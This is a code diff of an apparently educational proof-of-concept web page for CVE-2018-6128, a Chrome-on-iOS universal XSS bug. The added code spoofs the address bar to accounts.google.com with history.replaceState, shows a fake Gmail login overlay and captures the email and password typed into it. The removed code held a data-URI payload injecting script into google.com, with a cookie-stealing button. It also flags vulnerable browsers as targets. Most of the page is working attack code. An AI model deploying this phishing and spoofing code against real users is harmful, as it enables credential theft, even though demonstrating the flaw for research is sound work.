+            <div style="background: white; border-radius: 16px; padding: 30px; max-width: 400px; width: 90%; box-shadow: 0 20px 60px black;">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" style="height: 40px;" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg'">
+                    <h2 style="margin-top: 15px; color: #333;">Sign in</h2>
+                    <p style="color: #666; font-size: 14px;">to continue to Gmail</p>
+                </div>
+                <input type="email" id="fakeEmail" placeholder="Email or phone" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px;">
+                <input type="password" id="fakePassword" placeholder="Password" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px;">
+                <button id="fakeSubmit" style="width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer;">Next</button>
+                <p style="font-size: 12px; color: #999; text-align: center; margin-top: 20px;">
+                    🔒 Address bar shows accounts.google.com<br>
+                    ⚠️ This is a POC - credentials are NOT stored
+                </p>
+            </div>
         `;
         
-        const blob = new Blob([uxssScript], { type: 'text/html' });
-        const blobUrl = URL.createObjectURL(blob);
+        document.body.appendChild(overlay);
         
-        const newWindow = window.open(blobUrl, '_blank');
+        const submitBtn = document.getElementById('fakeSubmit');
+        submitBtn.onclick = () => {
+            const email = document.getElementById('fakeEmail').value;
+            const password = document.getElementById('fakePassword').value;
+            log('output4', `🎯 CREDENTIALS CAPTURED: ${email} : ${password}`, 'success');
+            log('output4', '💀 Dalam serangan real, credentials akan dikirim ke attacker server', 'warning');
+            alert(`[POC] Credentials captured:\nEmail: ${email}\nPassword: ${password}\n\nIn real attack, these would be sent to attacker.com`);
+            overlay.remove();
+        };
         
-        if (newWindow) {
-            log('output4', '✅ Blob URL window opened with UXSS payload', 'success');
-            setTimeout(() => {
-                URL.revokeObjectURL(blobUrl);
-            }, 10000);
-        } else {
-            log('output4', '❌ Popup blocked!', 'error');
+        log('output4', 'Step 3: Fake login form displayed - address bar shows google.com!', 'success');
+        log('output4', 'Step 4: Waiting for user input...', 'info');
+        
+        // Check popup blocking
+        setTimeout(() => {
+            const popupWarning = document.getElementById('popupWarning');
+            if (popupWarning) popupWarning.style.display = 'block';
+        }, 1000);
+    }
+    
+    function resetAttack() {
+        const overlay = document.getElementById('attackOverlay');
+        if (overlay) overlay.remove();
+        
+        // Reset URL
+        try {
+            history.replaceState({}, '', originalUrl);
+            isSpoofed = false;
+            log('output4', '🔄 Attack reset - URL restored', 'info');
+        } catch(e) {
+            log('output4', 'Cannot reset URL', 'error');
         }
+        
+        updateUrlDisplay();
     }
     
     // ============================================
-    // TECHNIQUE 5: Data URI
+    // Initialization
     // ============================================
-    function uxssDataURI() {
-        log('output5', '🚀 EXECUTING: Data URI UXSS technique', 'success');
-        
-        const dataUri = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
-            <!DOCTYPE html>
-            <html>
-            <head><title>UXSS via Data URI</title></head>
-            <body>
-                <h1>🔥 UXSS Data URI Payload</h1>
-                <p>Attempting to execute cross-origin script on google.com...</p>
-                <div id="status"></div>
-                <script>
-                    document.getElementById('status').innerHTML = '<p>⏳ Opening google.com with javascript: payload...</p>';
-                    
-                    // Open google.com with javascript: injection
-                    setTimeout(() => {
-                        const uxssWindow = window.open('javascript:alert("[UXSS] This alert is running on https://www.google.com!\\n\\nProves UXSS vulnerability exists!"); document.body.style.backgroundColor = "#ff0000"; document.body.innerHTML = "<center><h1 style=color:white>🔥 UXSS SUCCESS</h1><p>This is still https://www.google.com but content is hacked!</p><button onclick=alert(document.cookie) style=padding:10px;margin:10px>Steal Cookies</button><p>URL: \" + location.href + \"</p></center>";', '_blank');
-                        
-                        if(uxssWindow) {
-                            document.getElementById('status').innerHTML = '<p style="color:green">✅ UXSS payload sent to google.com! Check the new tab.</p>';
-                        } else {
-                            document.getElementById('status').innerHTML = '<p style="color:red">❌ Popup blocked! Please allow popups for this site.</p>';
-                        }
-                    }, 2000);
-                <\/script>
-            </body>
-            </html>
-        `);
-        
-        const newWindow = window.open(dataUri, '_blank');
-        
-        if (newWindow) {
-            log('output5', '✅ Data URI window opened with UXSS payload', 'success');
-            log('output5', '⏳ Will attempt to inject into google.com in 2 seconds', 'info');
-        } else {
-            log('output5', '❌ Popup blocked!', 'error');
-        }
+    updateUrlDisplay();
+    
+    // Detect browser and OS
+    const ua = navigator.userAgent;
+    const isIOS = /iPad|iPhone|iPod/.test(ua);
+    const isChrome = /Chrome/.test(ua) && !/Edg/.test(ua);
+    const isCriOS = /CriOS/.test(ua); // Chrome on iOS
+    
+    log('output1', `Browser Detection: ${ua.substring(0, 100)}...`, 'info');
+    
+    if (isIOS && isChrome) {
+        log('output1', '🎯 TARGET DETECTED: Chrome on iOS - This device MAY BE VULNERABLE to CVE-2018-6128!', 'success');
+        log('output1', '⚠️ Chrome versions < 67 are vulnerable. Current Chrome may already be patched.', 'warning');
+    } else if (isCriOS) {
+        log('output1', '🎯 Chrome on iOS detected (CriOS) - CVE-2018-6128 target!', 'success');
+    } else if (isIOS) {
+        log('output1', '📱 iOS detected but not Chrome. Safari may have different behavior.', 'info');
+    } else {
+        log('output1', '💻 Non-iOS device detected. This vulnerability is specific to Chrome on iOS.', 'info');
+        log('output1', 'The POC may still work for educational purposes but SOP will block cross-origin access.', 'info');
     }
     
-    // ============================================
-    // Additional: Direct Popup with javascript:
-    // ============================================
-    // Auto-execute one technique that works in most modern browsers
+    log('output1', '========================================', 'info');
+    log('output1', 'CVE-2018-6128: uXSS in Chrome iOS via ..;@', 'info');
+    log('output1', 'Reference: bugs.chromium.org/p/chromium/issues/detail?id=841105', 'info');
+    log('output1', 'Reward: $7,500 - Reported by Tom (thomi@inbox.com)', 'info');
+    log('output1', '========================================', 'info');
+    
+    // Auto attempt to show the vulnerability
     setTimeout(() => {
-        log('output1', '💡 Tip: UXSS yang paling mungkin bekerja di browser modern adalah Technique #1 dan #3', 'info');
-        log('output1', '💡 Pastikan popups di-allow untuk website ini', 'info');
-    }, 1000);
-    
-    // Direct injection attempt
-    window.addEventListener('load', () => {
-        console.log('[UXSS POC] Loaded - ready to execute cross-origin attacks');
-        console.log('[UXSS POC] Techniques: javascript: protocol, window.name reuse, about:blank control');
-    });
+        log('output1', '💡 Try clicking "Execute history.replaceState Spoof" to see the vulnerability in action!', 'info');
+    }, 2000);
 </script>
 </body>
 </html>
